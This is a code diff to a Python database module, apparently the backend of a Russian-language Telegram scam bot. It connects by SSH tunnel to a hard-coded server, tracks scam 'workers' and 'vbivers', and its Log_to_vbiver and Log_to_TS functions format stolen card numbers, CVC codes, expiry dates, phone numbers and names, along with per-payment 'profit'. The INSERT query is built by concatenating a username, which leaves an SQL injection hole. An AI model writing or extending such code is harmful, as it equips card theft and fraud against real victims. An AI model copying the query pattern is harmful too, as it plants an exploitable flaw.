@@ -1,6 +1,7 @@
 import pymysql
 from sshtunnel import SSHTunnelForwarder
 import config
+from util import fix_str
 try:
     server = SSHTunnelForwarder(
         '188.225.24.157',
@@ -10,10 +11,10 @@ try:
     )
     server.start()
     conncetion = pymysql.connect(host=config.Host,password=config.password_db,user=config.user_db,port=server.local_bind_port,cursorclass=pymysql.cursors.DictCursor,database=config.name_db)
-    print('не проблеммы с БД')
+    print(fix_str('не проблеммы с БД'))
     cursor = conncetion.cursor()
 except Exception as exc:
-    print('Проблеммы с БД')
+    print(fix_str('Проблеммы с БД'))
     print(exc)
 
 def add_new_worker(id,username):
@@ -29,13 +30,13 @@ def add_new_worker(id,username):
             flag = 1
     if flag != 1:
      try:
-      insect = "INSERT INTO accounts (user_id,promocode,rank,username) VALUES('"+str(id)+"','"+str(id)+"','новичок','"+username+"');"
+      insect = "INSERT INTO accounts (user_id,promocode,rank,username) VALUES('"+str(id)+"','"+str(id)+fix_str("','новичок','")+username+"');"
       cursor.execute(insect)
       conncetion.commit()
       conncetion.close()
       return True
      except Exception as exc:
-        print('ПРОБЛЕМЫ С БД!!!',exc)
+        print(fix_str('ПРОБЛЕМЫ С БД!!!'),exc)
         return False
     else:
         return False
@@ -75,7 +76,7 @@ def make_zaivka(id,username):
             conncetion.close()
             return True
         except Exception as exc:
-            print('ПРОБЛЕМЫ С БД!!', exc)
+            print(fix_str('ПРОБЛЕМЫ С БД!!'), exc)
             conncetion.close()
             return False
     else:
@@ -104,7 +105,7 @@ def block(id):
             pass
         return True
     except Exception as exc:
-        print('ПРОБЛЕМЫ С БД!!', exc)
+        print(fix_str('ПРОБЛЕМЫ С БД!!'), exc)
         return False
 def unblock(id):
     try:
@@ -121,7 +122,7 @@ def unblock(id):
 
         return True
     except Exception as exc:
-        print('ПРОБЛЕМЫ С БД!!', exc)
+        print(fix_str('ПРОБЛЕМЫ С БД!!'), exc)
 
         return False
 
@@ -308,18 +309,18 @@ def Log_to_vbiver(id):
         date = data[0]['data']
         worker = int(data[0]['worker'])
         usr = Worker_username(worker)
-        res = "➡️<b>Номер карты :</b> <code>" + code+" </code>⬅️\n"
-        res += "➡️<b>Номер телефона:</b> <code> " + phone + " </code> ⬅️\n"
-        res += "➡️<b>Имя:</b> <code> " + name + " </code> ⬅️\n"
-        res += "➡️<b>CVC:</b> <code> "+cvv+" </code> ⬅️\n"
-        res += "➡️<b>mm/yy:</b> <code> "+date+" </code> ⬅️\n"
-        res += "➡️<b>Воркер:</b> @" + usr + " ⬅️\n"
-        res += "📟<b>ID - "+ str(id)+"</b> 📟"
+        res = fix_str("➡️<b>Номер карты :</b> <code>") + code+fix_str(" </code>⬅️\n")
+        res += fix_str("➡️<b>Номер телефона:</b> <code> ") + phone + fix_str(" </code> ⬅️\n")
+        res += fix_str("➡️<b>Имя:</b> <code> ") + name + fix_str(" </code> ⬅️\n")
+        res += fix_str("➡️<b>CVC:</b> <code> ")+cvv+fix_str(" </code> ⬅️\n")
+        res += fix_str("➡️<b>mm/yy:</b> <code> ")+date+fix_str(" </code> ⬅️\n")
+        res += fix_str("➡️<b>Воркер:</b> @") + usr + fix_str(" ⬅️\n")
+        res += fix_str("📟<b>ID - ")+ str(id)+fix_str("</b> 📟")
         conncetion.close()
         return res
     except Exception as exc:
         print(exc)
-        return 'Ошибка'
+        return fix_str('Ошибка')
 def Log_to_TS(id,type,price):
     try:
         conncetion = pymysql.connect(host=config.Host, password=config.password_db, user=config.user_db, port=server.local_bind_port,
@@ -333,11 +334,11 @@ def Log_to_TS(id,type,price):
         worker = int(data[0]['worker'])
         usr = Worker_username(worker)
         vb = Worker_username(vbiver)
-        res = '❗️<b>Новая Оплата</b>❗️\n\n'
-        res +='     👨‍💻<b>Вбивер:</b> @' + vb+'\n\n'
-        res += '     🦺<b>Воркер: </b> @' + usr + '\n\n'
-        res +='     💰<b>Профит: ' + str(price)+'</b>₽\n\n'
-        res += '     <b>💼Тип оплаты:</b> '+ type
+        res = fix_str('❗️<b>Новая Оплата</b>❗️\n\n')
+        res +=fix_str('     👨‍💻<b>Вбивер:</b> @') + vb+'\n\n'
+        res += fix_str('     🦺<b>Воркер: </b> @') + usr + '\n\n'
+        res +=fix_str('     💰<b>Профит: ') + str(price)+fix_str('</b>₽\n\n')
+        res += fix_str('     <b>💼Тип оплаты:</b> ')+ type
         conncetion.close()
         return res
     except Exception as exc:
